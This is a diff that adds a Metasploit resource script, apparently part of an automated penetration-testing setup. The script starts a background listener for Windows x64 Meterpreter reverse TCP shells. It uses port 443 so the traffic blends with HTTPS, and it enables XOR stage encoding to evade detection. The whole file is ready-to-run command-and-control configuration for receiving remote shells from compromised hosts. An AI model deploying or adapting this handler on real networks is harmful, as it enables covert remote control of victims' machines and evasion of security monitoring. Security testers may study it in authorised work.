@@ -1,0 +1,13 @@
+# Windows x64 Meterpreter Reverse TCP Handler
+# Port: 443 (blends with HTTPS traffic)
+# Requires: LHOST set globally via setup_msf_from_auto_recon.sh
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LPORT 443
+set ExitOnSession false
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+
+echo "[*] Starting Windows x64 Meterpreter handler on ${LHOST}:443"
+run -j
